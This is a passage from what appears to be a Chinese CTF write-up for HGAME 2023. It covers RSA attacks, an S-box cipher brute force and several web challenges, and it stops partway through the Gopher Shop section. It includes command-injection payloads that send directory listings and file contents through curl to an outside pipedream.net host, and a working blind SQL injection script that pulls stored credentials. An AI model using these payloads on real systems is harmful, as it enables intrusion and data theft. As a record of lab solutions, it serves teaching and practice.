class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">factor_rsa_wiener</span>(<span class="params">N, e</span>):</span><br><span class="line">    N = Integer(N)</span><br><span class="line">    e = Integer(e)</span><br><span class="line">    cf = (e / N).continued_fraction().convergents()</span><br><span class="line">    <span class="keyword">for</span> f <span class="keyword">in</span> cf:</span><br><span class="line">        k = f.numer()</span><br><span class="line">        d = f.denom()</span><br><span class="line">        <span class="keyword">if</span> k == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        phi_N = ((e * d) - <span class="number">1</span>) / k</span><br><span class="line">        b = -(N - phi_N + <span class="number">1</span>)</span><br><span class="line">        dis = b ^ <span class="number">2</span> - <span class="number">4</span> * N</span><br><span class="line">        <span class="keyword">if</span> dis.sign() == <span class="number">1</span>:</span><br><span class="line">            dis_sqrt = sqrt(dis)</span><br><span class="line">            p = (-b + dis_sqrt) / <span class="number">2</span></span><br><span class="line">            q = (-b - dis_sqrt) / <span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> p.is_integer() <span class="keyword">and</span> q.is_integer() <span class="keyword">and</span> (p * q) % N == <span class="number">0</span>:</span><br><span class="line">                p = p % N</span><br><span class="line">                q = q % N</span><br><span class="line">                <span class="keyword">if</span> p &gt; q:</span><br><span class="line">                    <span class="keyword">return</span> (p, q)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">return</span> (q, p)</span><br><span class="line"></span><br><span class="line">N = <span class="number">137549711547277501490512652253223705009896739033213206450427185227633740625388392382604507796908923883409603222056205390907355567345203551544782114279172864959402320300753748333020687530365352630647687557310169459736318329569719516536939612675375837585785285970788429934265825996569888095986259096503876786157</span></span><br><span class="line">e = <span class="number">93353589564181636718027173778502268418513041301835540045681119331234573983360292187550959060357949657609295815897069024673722589144338487101058734688906424145037973559780521703111302989561973563657725186914522917495401111500951519775376691911667795239110869653121682582184013495282531768528802139272651917441</span></span><br><span class="line">c = <span class="number">0x24e544c4b398ed0812a1739127c026d2b8eeba2b1e5c9221a6debaa9ebfeb134c6dfcbcf3142ec2723b6990d25d4bb0d7f14e4034c4a8be71d46015e6ae65cc8e1872f62860e5b89cd59f48420e9a3e85dcbdf34c850688046026fcf4ffb504baef704ff049f49494bbfb05624a30c542051fada959dff52fefc378489e20c60</span></span><br><span class="line">p, q = factor_rsa_wiener(N, e)</span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e,f)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,N)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment"># b&#x27;wiener_attack_easily!!!&#x27;</span></span><br></pre></td></tr></table></figure><p>第二层，已知 $p$ 高位攻击+ $\gcd(e,\varphi)=2$ 情形，coppersmith+AMM算法。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">N = <span class="number">68414473664421192639324860086304622601462638941429703900601142401666806262479832339441486761549640560858310048110541758196980937681745306684526118613694088585953109432823793467906611480953093877867597017269693809377188442523548160628479089952031515541299395812090799992365148053327937407652550818853770241959</span></span><br><span class="line">e = <span class="number">62830</span></span><br><span class="line">c = <span class="number">0x520ba82a569ea52f16b84c4415186cd616680131e3ac6eda886fea046b18b0e1326d4acbbfb8840dc8064211cd44c30b91148836048434a3f57dd4ec5a5cdaf005a0f8f2c95ee7d9a739505b01e407acd3441dd088f64a2a0c36e43c520e30bd90bb32ec1125e4bb1f4e7d522596898da22c9a7921ac5da96808ee39c98e131f</span></span><br><span class="line">pbits = <span class="number">512</span></span><br><span class="line"></span><br><span class="line">find = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>**i):</span><br><span class="line">        p4 = Integer(gmpy2.iroot(N,<span class="number">2</span>)[<span class="number">0</span>])&gt;&gt;<span class="number">256</span></span><br><span class="line">        p4 = (p4&lt;&lt;i) + j</span><br><span class="line">        kbits = pbits - p4.nbits()</span><br><span class="line">        p4 = p4 &lt;&lt; kbits</span><br><span class="line">        PR.&lt;x&gt; = PolynomialRing(Zmod(N))</span><br><span class="line">        f = x + p4</span><br><span class="line">        roots = f.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">0.5</span>)</span><br><span class="line">        <span class="keyword">if</span> roots:</span><br><span class="line">            p = p4+<span class="built_in">int</span>(roots[<span class="number">0</span>]) </span><br><span class="line">            <span class="keyword">if</span> N%p == <span class="number">0</span>:</span><br><span class="line">                <span class="built_in">print</span>(p)</span><br><span class="line">                find = <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> find == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line">q = N // p</span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e//<span class="number">2</span>,f)</span><br><span class="line">cc = <span class="built_in">pow</span>(c,d,N)</span><br><span class="line"></span><br><span class="line">P.&lt;a&gt;=PolynomialRing(Zmod(p),implementation=<span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line">f=a^<span class="number">2</span>-cc</span><br><span class="line">mps=f.monic().roots()</span><br><span class="line"></span><br><span class="line">P.&lt;a&gt;=PolynomialRing(Zmod(q),implementation=<span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line">g=a^<span class="number">2</span>-cc</span><br><span class="line">mqs=g.monic().roots()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> mpp <span class="keyword">in</span> mps:</span><br><span class="line">    x=mpp[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> mqq <span class="keyword">in</span> mqs:</span><br><span class="line">        y=mqq[<span class="number">0</span>]</span><br><span class="line">        solution = <span class="built_in">hex</span>(CRT_list([<span class="built_in">int</span>(x), <span class="built_in">int</span>(y)], [p, q]))[<span class="number">2</span>:]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(solution) % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(solution))</span><br><span class="line"><span class="comment"># b&#x27;how_to_solve_e_and_phi_uncoprime_condision&#x27;</span></span><br></pre></td></tr></table></figure><p>第三层，已知 $p$ 高位攻击，但泄露位数过少，位爆破+调节参数扩大格范围。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">68340867186438223292118569682710524595966327481168801678255800028919163918249557519447553078528255888326840419621716908729880235244230459900539486879943421761586611726942757775742624070088176246368128990077459966006579285028594729801017390816903003704541109757846868073362640037019813128220657114558520107057</span></span><br><span class="line"></span><br><span class="line">pbits = <span class="number">512</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> trange(<span class="number">2</span>**<span class="number">5</span>):</span><br><span class="line">p4 = <span class="number">531320819410375258952658395582915285878636410772332266245849790153420724865787</span>&lt;&lt;(<span class="number">253</span>-<span class="number">248</span>)</span><br><span class="line">p4 = p4 + i</span><br><span class="line">kbits = pbits - p4.nbits()</span><br><span class="line">p4 = p4 &lt;&lt; kbits</span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = x + p4</span><br><span class="line">roots = f.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">0.4</span>, epsilon=<span class="number">0.01</span>)</span><br><span class="line"><span class="keyword">if</span> roots:        </span><br><span class="line">p = p4+<span class="built_in">int</span>(roots[<span class="number">0</span>]) </span><br><span class="line"><span class="keyword">if</span> n%p==<span class="number">0</span>:</span><br><span class="line"><span class="built_in">print</span>(i,p)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line">q = n//p</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">0x29d543c73f4175f22440eef5954184e9d740cd3785011d560431861ccf6c4ff380d46ad948f9888e8cac2f5e38ce5e994f023d7195b78439b90d53ad23a730cc99b1b75dae1aba416cb6e645c5d135de906be54f344daba47a10492183d03211bfbaa45c09be2bb1913b1453e0538db95c56140cb78dd9c43d21f8312245ef7d</span></span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e,f)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment"># b&#x27;now_you_know_how_to_use_coppersmith&#x27;</span></span><br></pre></td></tr></table></figure><p>三次提交正确得flag：<code>hgame&#123;U_mus7_b3_RS4_M@ster!!!&#125;</code>。</p><p>​    </p><h3 id="ezBlock"><a href="#ezBlock" class="headerlink" title="ezBlock"></a>ezBlock</h3><blockquote><p>兔兔拜年的时候遇到了 yolande ，yolande 说她之前在写差分攻击脚本，问兔兔要不要学习一下，还说如果遇到问题可以看看 The Block Cipher Companion.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s_substitute</span>(<span class="params">m</span>):</span><br><span class="line">    c = <span class="number">0</span></span><br><span class="line">    s_box = &#123;<span class="number">0</span>: <span class="number">0x6</span>, <span class="number">1</span>: <span class="number">0x4</span>, <span class="number">2</span>: <span class="number">0xc</span>, <span class="number">3</span>: <span class="number">0x5</span>, <span class="number">4</span>: <span class="number">0x0</span>, <span class="number">5</span>: <span class="number">0x7</span>, <span class="number">6</span>: <span class="number">0x2</span>, <span class="number">7</span>: <span class="number">0xe</span>, <span class="number">8</span>: <span class="number">0x1</span>, <span class="number">9</span>: <span class="number">0xf</span>, <span class="number">10</span>: <span class="number">0x3</span>, <span class="number">11</span>: <span class="number">0xd</span>, <span class="number">12</span>: <span class="number">0x8</span>,</span><br><span class="line">             <span class="number">13</span>: <span class="number">0xa</span>, <span class="number">14</span>: <span class="number">0x9</span>, <span class="number">15</span>: <span class="number">0xb</span>&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">16</span>, <span class="number">4</span>):</span><br><span class="line">        t = (m &gt;&gt; i) &amp; <span class="number">0xf</span></span><br><span class="line">        t = s_box[t]</span><br><span class="line">        c += t &lt;&lt; i</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">m, key</span>):</span><br><span class="line">    n = <span class="built_in">len</span>(key)</span><br><span class="line">    t = m</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>):</span><br><span class="line">        t = t ^ key[i]</span><br><span class="line">        t = s_substitute(t)</span><br><span class="line">    c = t ^ key[n - <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f = flag[<span class="number">6</span>:-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">assert</span> flag == <span class="string">&#x27;hgame&#123;&#x27;</span> + f + <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">key = [<span class="built_in">int</span>(i, <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> f.split(<span class="string">&#x27;_&#x27;</span>)]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(key))</span><br><span class="line">m_list = [i * <span class="number">0x1111</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)]</span><br><span class="line">c_list = [enc(m, key) <span class="keyword">for</span> m <span class="keyword">in</span> m_list]</span><br><span class="line"><span class="built_in">print</span>(c_list)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5</span></span><br><span class="line"><span class="comment"># [28590, 33943, 30267, 5412, 11529, 3089, 46924, 59533, 12915, 37743, 64090, 53680, 18933, 49378, 23512, 44742]</span></span><br></pre></td></tr></table></figure></blockquote><p>正常考点应该是四轮S盒差分攻击，<code>xxxx_xxxx_xxxx_xxxx_xxxx</code> 分割得到5组key，测试发现5组key的每4位（每1个16进制数）为一组作为输入，得到的输出是固定不变的，采用爆破方式可解，所需遍历次数为 $4 \cdot 16^5=4194304$。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"></span><br><span class="line">m = [i * <span class="number">0x1111</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)]</span><br><span class="line">c = [<span class="number">28590</span>, <span class="number">33943</span>, <span class="number">30267</span>, <span class="number">5412</span>, <span class="number">11529</span>, <span class="number">3089</span>, <span class="number">46924</span>, <span class="number">59533</span>, <span class="number">12915</span>, <span class="number">37743</span>, <span class="number">64090</span>, <span class="number">53680</span>, <span class="number">18933</span>, <span class="number">49378</span>, <span class="number">23512</span>, <span class="number">44742</span>]</span><br><span class="line">m = [[(k &gt;&gt; i) &amp; <span class="number">0xf</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">16</span>, <span class="number">4</span>)] <span class="keyword">for</span> k <span class="keyword">in</span> m]</span><br><span class="line">c = [[(k &gt;&gt; i) &amp; <span class="number">0xf</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">16</span>, <span class="number">4</span>)] <span class="keyword">for</span> k <span class="keyword">in</span> c]</span><br><span class="line"><span class="comment">#print(m)</span></span><br><span class="line"><span class="comment">#print(c)</span></span><br><span class="line"></span><br><span class="line">m = [[k[i] <span class="keyword">for</span> k <span class="keyword">in</span> m] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">c = [[k[i] <span class="keyword">for</span> k <span class="keyword">in</span> c] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s_substitute</span>(<span class="params">m</span>):</span><br><span class="line">    c = <span class="number">0</span></span><br><span class="line">    s_box = &#123;<span class="number">0</span>: <span class="number">0x6</span>, <span class="number">1</span>: <span class="number">0x4</span>, <span class="number">2</span>: <span class="number">0xc</span>, <span class="number">3</span>: <span class="number">0x5</span>, <span class="number">4</span>: <span class="number">0x0</span>, <span class="number">5</span>: <span class="number">0x7</span>, <span class="number">6</span>: <span class="number">0x2</span>, <span class="number">7</span>: <span class="number">0xe</span>, <span class="number">8</span>: <span class="number">0x1</span>, <span class="number">9</span>: <span class="number">0xf</span>, <span class="number">10</span>: <span class="number">0x3</span>, <span class="number">11</span>: <span class="number">0xd</span>, <span class="number">12</span>: <span class="number">0x8</span>,</span><br><span class="line">             <span class="number">13</span>: <span class="number">0xa</span>, <span class="number">14</span>: <span class="number">0x9</span>, <span class="number">15</span>: <span class="number">0xb</span>&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">16</span>, <span class="number">4</span>):</span><br><span class="line">        t = (m &gt;&gt; i) &amp; <span class="number">0xf</span></span><br><span class="line">        t = s_box[t]</span><br><span class="line">        c += t &lt;&lt; i</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">m, key</span>):</span><br><span class="line">    n = <span class="built_in">len</span>(key)</span><br><span class="line">    t = m</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>):</span><br><span class="line">        t = t ^ key[i]</span><br><span class="line">        t = s_substitute(t)</span><br><span class="line">    c = t ^ key[n - <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line">m_list = [i * <span class="number">0x1111</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)]</span><br><span class="line">finalkey = [<span class="string">&#x27;&#x27;</span>]*<span class="number">5</span></span><br><span class="line"></span><br><span class="line">dic = <span class="string">&#x27;0123456789abcdef&#x27;</span></span><br><span class="line">allc = <span class="built_in">list</span>(product(dic,repeat=<span class="number">5</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> tqdm(allc):</span><br><span class="line">        key = [(<span class="built_in">int</span>(x, <span class="number">16</span>))&lt;&lt;(<span class="number">4</span>*i) <span class="keyword">for</span> x <span class="keyword">in</span> k]</span><br><span class="line">        c_list = [enc(m, key) <span class="keyword">for</span> m <span class="keyword">in</span> m_list]</span><br><span class="line">        out = [(k &gt;&gt; (<span class="number">4</span>*i)) &amp; <span class="number">0xf</span> <span class="keyword">for</span> k <span class="keyword">in</span> c_list]</span><br><span class="line">        <span class="keyword">if</span> out == c[i]:</span><br><span class="line">            <span class="built_in">print</span>(i,k)</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">                finalkey[j] = k[j] + finalkey[j]</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;hgame&#123;&#x27;</span>+<span class="string">&#x27;_&#x27;</span>.join(finalkey)+<span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0 (&#x27;2&#x27;, &#x27;3&#x27;, &#x27;2&#x27;, &#x27;0&#x27;, &#x27;5&#x27;)</span></span><br><span class="line"><span class="comment"># 1 (&#x27;4&#x27;, &#x27;9&#x27;, &#x27;9&#x27;, &#x27;7&#x27;, &#x27;d&#x27;)</span></span><br><span class="line"><span class="comment"># 2 (&#x27;f&#x27;, &#x27;4&#x27;, &#x27;f&#x27;, &#x27;5&#x27;, &#x27;8&#x27;)</span></span><br><span class="line"><span class="comment"># 3 (&#x27;4&#x27;, &#x27;f&#x27;, &#x27;4&#x27;, &#x27;4&#x27;, &#x27;d&#x27;)</span></span><br><span class="line"><span class="comment"># hgame&#123;4f42_f493_4f92_4570_d8d5&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Ping-To-The-Host"><a href="#Ping-To-The-Host" class="headerlink" title="Ping To The Host"></a>Ping To The Host</h3><blockquote><p>一个用来输入ip的ping工具，我可以用它来做些什么？</p></blockquote><p>无回显命令注入，外带即可。空格使用 <code>$IFS$9</code> 绕过。</p><p>列目录：<code>ip=x|curl$IFS$9https://enm8badfmuo0f.x.pipedream.net/?p=`ls$IFS$9/|base64` </code>，得到flag文件名为 <code>flag_is_here_haha</code>；</p><p>读文件：<code>ip=x|curl$IFS$9https://enm8badfmuo0f.x.pipedream.net/?p=`uniq$IFS$9/f*|base64` </code>，得到 <code>aGdhbWV7cDFuR190MF9Db21NNG5EX0V4ZWNVdDFvbl9kQW5nRXJSclJyUnJSIX0K</code>，base64解码得 <code>hgame&#123;p1nG_t0_ComM4nD_ExecUt1on_dAngErRrRrRrR!&#125;</code>。</p><p>​    </p><h3 id="Login-To-Get-My-Gift"><a href="#Login-To-Get-My-Gift" class="headerlink" title="Login To Get My Gift"></a>Login To Get My Gift</h3><blockquote><p>R1esbyfe：“想必你上周已经找到了我留给你的惊喜，这次我又藏了一个” </p><p>兔兔想起了上周R1esbyfe学长教的sql基础知识与运用方法，是时候将他们派上用场了 </p><p>R1esbyfe：“给你个用户名为testuser，密码为testpassword的test账户吧，不过只有真正的管理员才能得到惊喜:D 别想了，管理员用户名可不是admin”</p><p>After login, you can visit: </p><p>/index -&gt; Only for test users </p><p>/home -&gt; Only for admin users</p></blockquote><p>fuzz测试，发现过滤了空格、等号、substr、mid等，等号用 <code>regexp</code> 绕过，<code>substr()</code> 用 <code>right(left())</code> 绕过来取字符。布尔盲注：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://week-3.hgame.lwsec.cn:31673/login&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment">#payload = f&#x27;if(ascii(right(left((select(database())),&#123;i&#125;),1))&gt;&#123;mid&#125;,1,0)&#x27;</span></span><br><span class="line">        <span class="comment">#payload = f&#x27;if(ascii(right(left((select(group_concat(table_name))from(information_schema.tables)where((table_schema)regexp(&quot;L0g1NMe&quot;))),&#123;i&#125;),1))&gt;&#123;mid&#125;,1,0)&#x27;</span></span><br><span class="line">        <span class="comment">#payload = f&#x27;if(ascii(right(left((select(group_concat(column_name))from(information_schema.columns)where((table_schema)regexp(&quot;L0g1NMe&quot;))),&#123;i&#125;),1))&gt;&#123;mid&#125;,1,0)&#x27;</span></span><br><span class="line">        payload = <span class="string">f&#x27;if(ascii(right(left((select(group_concat(PAssw0rD,&quot;~&quot;,UsErN4me))from(L0g1NMe.User1nf0mAt1on)),<span class="subst">&#123;i&#125;</span>),1))&gt;<span class="subst">&#123;mid&#125;</span>,1,0)&#x27;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;testuser&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">f&quot;1&#x27;^(<span class="subst">&#123;payload&#125;</span>)^&#x27;0&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        <span class="comment">#print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Success!&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><p>分别得到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">database: L0g1NMe</span><br><span class="line">table: User1nf0mAt1on</span><br><span class="line">column: id,PAssw0rD,UsErN4me</span><br><span class="line">flag: WeLc0meT0hgAmE2023~hAPPySqlhgAmE2023HAppYnEwyEAr,testpassword~testuser</span><br></pre></td></tr></table></figure><p>使用账密 <code>WeLc0meT0hgAmE2023/hAPPySqlhgAmE2023HAppYnEwyEAr</code> 登录，得flag：<code>hgame&#123;It_1s_1n7EresT1nG_T0_ExPL0Re_Var10us_Ways_To_Sql1njEct1on&#125;</code>。</p><p>​    </p><h3 id="Gopher-Shop"><a href="#Gopher-Shop" class="headerlink" title="Gopher Shop"></a>Gopher Shop</h3><blockquote><p>今天是大年初二！兔兔迈着开心的步伐走到了一教，据说每逢寒假HGAME期间，300b就会有Vidar大商场，每个进入商场的同学都可以领取10个Vidar币。兔兔在一家叫Gopher Shop的商店面前停下了脚步，Gopher？听说协会的Web手们都会一点Go,也许这是协会学长开的吧。望着橱窗里的商品，攥着手里的10个Vidar币，兔兔走进了商店…</p></blockquote><p>在 <code>/buyProduct</code> 路由处利用竞争买flag。</p><figure class="highlight python"><table><tr><td 